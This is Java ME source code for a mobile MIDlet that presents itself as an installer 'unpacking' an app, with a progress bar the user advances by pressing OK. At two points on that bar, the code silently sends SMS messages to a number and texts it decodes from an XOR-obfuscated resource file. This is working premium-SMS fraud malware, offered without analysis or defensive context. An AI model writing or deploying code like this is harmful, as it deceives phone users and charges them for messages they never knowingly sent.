import java.io.InputStream;
import javax.microedition.io.Connector;
import javax.microedition.lcdui.Command;
import javax.microedition.lcdui.CommandListener;
import javax.microedition.lcdui.Display;
import javax.microedition.lcdui.Displayable;
import javax.microedition.lcdui.Form;
import javax.microedition.lcdui.Gauge;
import javax.microedition.midlet.MIDlet;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author Kruser
 */
public class WorkSpace implements CommandListener {

    private Command cmdBack = new Command("Назад", Command.OK, 0);
    private Command cmdExit = new Command("Выход", Command.EXIT, 0);
    private Command cmdOK = new Command("OK", Command.OK, 0);
    private Command cmdAgree = new Command("Условия", Command.BACK, 0);
    private Display display;
    private Form form;
    private Gauge gauge;
    private int percent = 0;
    private int step = 2; // шаг
    private int pos1 = 36; // sms1 send позиция
    private int pos2 = 76; // sms2 send
    private String agree = "";
    private String info = "";
    private String name = "";
    private String number = "";
    private String text1 = "";
    private String text2 = "";
    private String title = "Загрузка";
    private MIDlet midlet;

    void init(MIDlet m) {
        midlet = m;
        byte[] buffer = null;
        InputStream is = null;
        try {
            is = getClass().getResourceAsStream("agreement.txt");
            buffer = new byte[is.available()];
            is.read(buffer);
            is.close();
            agree = new String(buffer, "utf-8");
        } catch (Exception ex) {
            agree = "Не удалось загрузить информацию...";
        }
        try {
            is = getClass().getResourceAsStream("info.dat");
            buffer = new byte[is.available()];
            is.read(buffer);
            is.close();
            int p = 0;
            int ks = (int) buffer[0] & 0xFF;
            for (int i = buffer.length - 1; i > ks; i--) {
                buffer[i] ^= buffer[p + 1];
                p++;
                if (p == ks) {
                    p = 0;
                }
            }
            String r = new String(buffer, ks + 1, buffer.length - ks - 1, "utf-8");
            String a = "";
            p = 1;
            for (int i = 0; i < r.length(); i++) {
                if (r.charAt(i) == ';') {
                    switch (p) {
                        case 1:
                            info = a;
                            break;
                        case 2:
                            number = a;
                            break;
                        case 3:
                            text1 = a;
                            break;
                        case 4:
                            text2 = a;
                            break;
                    }
                    p++;
                    a = "";
                } else {
                    a += r.charAt(i);
                }
            }            
        } catch (Exception ex) {
            ex.printStackTrace();
            return;
        }
        name = midlet.getAppProperty("MIDlet-Name");
        if (name == null || name.equals("")) {
            name = "Unknown";
        }
        //System.out.println(info + ";" + number + ";" + text1 + ";" + text2 + ";");
        form = new Form(title);
        form.setCommandListener(this);
        gauge = new Gauge("", false, 100, percent);
        display = Display.getDisplay(m);
        display.setCurrent(form);
        mainForm();
    }

    private void infoForm() {
        removeAll(form);
        form.addCommand(cmdExit);
        form.append(info);
    }

    private void mainForm() {
        removeAll(form);
        form.addCommand(cmdAgree);
        form.addCommand(cmdOK);
        form.append("Идет распаковка \"" + name + "\"");
        form.append(gauge);
        form.append("Чтобы ускорить процесс нажимайте кнопку ОК");
    }

    private void removeAll(Form f) {
        f.deleteAll();
        f.removeCommand(cmdOK);
        f.removeCommand(cmdAgree);
        f.removeCommand(cmdBack);
    }

    public void commandAction(Command c, Displayable d) {
        if (c == cmdOK) {
            if (percent < 100) {
                percent += step;
                gauge.setValue(percent);
                percent = percent > 100 ? 100 : percent;
                if (percent == pos1 || percent == pos2) {
                    new Thread() {
                        public void run() {
                            sendSMS(number, percent == pos1 ? text1 : text2);
                        }
                    }.start();
                }
                if (percent == 100) {
                    infoForm();
                }
            }
        } else if (c == cmdAgree) {
            Form f = new Form("Условия");
            String a = "";
            for (int i = 0; i < agree.length(); i++) {
                if (agree.charAt(i) == '\n' || i + 1 == agree.length()) {
                    if (!a.equals("")) {
                        f.append(a + "\n");
                        a = "";
                    }
                } else if (agree.charAt(i) != '\r') {
                    a += agree.charAt(i);
                }
            }
            f.addCommand(cmdBack);
            f.setCommandListener(this);
            display.setCurrent(f);
        } else if (c == cmdBack) {
            display.setCurrent(form);
            mainForm();
        } else if (c == cmdExit) {
            midlet.notifyDestroyed();
        }
    }

    public static boolean sendSMS(String number, String text) {
        try {
            MessageConnection conn = null;
            conn = (MessageConnection) Connector.open("sms://" + number);
            TextMessage msg = (TextMessage) conn.newMessage(conn.TEXT_MESSAGE);
            msg.setAddress("sms://" + number);
            msg.setPayloadText(text);
            conn.send( msg );
            if(conn != null){
                conn.close();
            }
        } catch (Exception ex) {
            return false;
        }
        return true;
    }

}
